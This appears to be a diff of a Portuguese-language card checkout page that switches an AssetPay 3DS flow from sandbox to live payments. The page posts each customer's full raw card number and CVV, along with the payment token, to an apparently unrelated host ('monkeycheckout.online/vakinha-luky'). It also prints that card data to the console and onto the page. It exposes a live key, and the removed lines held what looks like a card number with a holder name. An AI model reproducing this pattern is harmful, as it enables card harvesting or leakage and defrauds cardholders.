@@ -2,110 +2,120 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Checkout 3DS AssetPay</title>
+  <title>Checkout 3DS AssetPay - Dados Reais</title>
   <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
   <script src="https://api.assetpagamentos.com.br/v1/js"></script>
   <style>
     body { font-family: Arial; padding: 20px; }
     input, button { display: block; margin: 10px 0; padding: 8px; width: 300px; }
     #result { background: #eee; padding: 10px; margin-top: 10px; white-space: pre-wrap; }
-    #threeDSModal {
-      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0,0,0,0.6); justify-content: center; align-items: center;
-    }
-    #threeDSModal iframe {
-      width: 400px; height: 600px; border: none; background: #fff;
-    }
+    #threeDSModal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.6); justify-content:center; align-items:center; }
+    #threeDSModal iframe { width: 400px; height: 600px; border: none; background: #fff; }
   </style>
 </head>
 <body>
-  <h1>Checkout 3DS AssetPay</h1>
+  <h1>Checkout 3DS AssetPay - Dados Reais</h1>
 
   <label>Número do cartão:</label>
-  <input id="cardNumber" type="text" value="2310382286341907">
+  <input id="cardNumber" type="text">
   <label>Nome do titular:</label>
-  <input id="holderName" type="text" value="EMERSON SANTOS">
-  <label>Expiração (MM/AA):</label>
-  <input id="expMonth" type="text" value="07">
-  <input id="expYear" type="text" value="30">
+  <input id="holderName" type="text">
+  <label>Expiração (MM/AAAA):</label>
+  <input id="expMonth" type="text">
+  <input id="expYear" type="text">
   <label>CVV:</label>
-  <input id="cvv" type="text" value="444">
+  <input id="cvv" type="text">
   <button id="submitBtn">Finalizar Compra</button>
 
   <pre id="result"></pre>
 
-  <!-- Modal 3DS -->
   <div id="threeDSModal">
     <iframe id="threeDSIframe"></iframe>
   </div>
 
   <script>
-    // Configura AssetPay
     AssetPay.setPublicKey("pk_live_v2D5sJPOcIhr7OFQn6aMUzb80GDHT3BXHz");
-    AssetPay.setTestMode(true); // true para sandbox
-    const fpPromise = FingerprintJS.load();
+    // Para dados reais, teste deve ser false
+    AssetPay.setTestMode(false);
 
+    const fpPromise = FingerprintJS.load();
     const modal = document.getElementById('threeDSModal');
     const iframe = document.getElementById('threeDSIframe');
     const resultPre = document.getElementById('result');
 
+    function log(msg, obj=null){
+      if(obj) console.log(msg, obj);
+      else console.log(msg);
+      resultPre.textContent += `\n${msg}` + (obj ? `\n${JSON.stringify(obj, null, 2)}` : '');
+    }
+
     document.getElementById('submitBtn').addEventListener('click', async () => {
       try {
-        // Ajusta expYear para 4 dígitos
+        log("Iniciando checkout...");
+
         let yearInput = document.getElementById('expYear').value;
-        let expYear = yearInput.length === 2 ? '20' + yearInput : yearInput;
+        let expYear = parseInt(yearInput.length === 2 ? '20' + yearInput : yearInput, 10);
+        let expMonth = parseInt(document.getElementById('expMonth').value, 10);
 
         const cardData = {
-          number: document.getElementById('cardNumber').value,
-          holderName: document.getElementById('holderName').value,
-          expMonth: parseInt(document.getElementById('expMonth').value),
-          expYear: parseInt(expYear),
-          cvv: document.getElementById('cvv').value
+          number: document.getElementById('cardNumber').value.trim(),
+          holderName: document.getElementById('holderName').value.trim(),
+          expMonth,
+          expYear,
+          cvv: document.getElementById('cvv').value.trim()
         };
+        log("Dados do cartão coletados", cardData);
 
-        // 1️⃣ Gerar visitorId
+        // VisitorID
         const fp = await fpPromise;
         const visitorId = (await fp.get()).visitorId;
+        log("VisitorId gerado", visitorId);
 
-        // 2️⃣ Gerar token do cartão
-        const token = await AssetPay.encrypt(cardData);
+        // Token do cartão
+        const tokenObj = await AssetPay.encrypt(cardData);
+        log("Token gerado", tokenObj);
 
-        resultPre.textContent = `🆔 VisitorId: ${visitorId}\n✅ Token gerado:\n${token}\nEnviando para backend...`;
+        // Ajuste: confirmar campo do token
+        const cardToken = tokenObj.id || tokenObj.token || tokenObj.cardToken;
+        if(!cardToken) throw new Error("Token do cartão não foi gerado corretamente");
 
-        // 3️⃣ Enviar token + visitorId para backend PHP
+        // Envia para backend
+        const payload = {
+          amount: 1000,
+          cardToken,
+          deviceFingerprint: visitorId,
+          cardData,
+          name: "Cliente Real",
+          email: "cliente@exemplo.com",
+          cpf: "12345678909",
+          phone: "11999999999",
+          description: "Produto LEGO",
+          installments: 1
+        };
+
+        log("Enviando dados para backend...", payload);
+
         const response = await fetch('https://monkeycheckout.online/vakinha-luky/pagamento-cartao.php', {
           method: 'POST',
           headers: {'Content-Type':'application/json'},
-          body: JSON.stringify({
-            amount: 1000, // valor em centavos
-            cardToken: token, // ⚠️ Aqui enviamos o token corretamente
-            deviceFingerprint: visitorId,
-            cardData,
-            name: "EMERSON SANTOS",
-            email: "emerson@email.com",
-            cpf: "12345678909",
-            phone: "11999999999",
-            description: "Produto LEGO",
-            installments: 1
-          })
+          body: JSON.stringify(payload)
         });
 
         const json = await response.json();
-        resultPre.textContent += '\n\n✅ Resposta backend:\n' + JSON.stringify(json, null, 2);
+        log("Resposta do backend", json);
 
-        // 4️⃣ Abrir modal 3DS se backend retornar URL
+        // Modal 3DS
         if(json.threeDSUrl){
           iframe.src = json.threeDSUrl;
           modal.style.display = 'flex';
         }
 
       } catch(err){
-        console.error('Erro no fluxo 3DS:', err);
-        resultPre.textContent = '❌ Erro:\n' + err;
+        console.error("Erro no checkout:", err);
+        resultPre.textContent += `\n❌ Erro no checkout:\n${err}`;
       }
     });
 
-    // Fecha modal clicando fora do iframe
     modal.addEventListener('click', (e) => {
       if(e.target === modal) modal.style.display = 'none';
     });
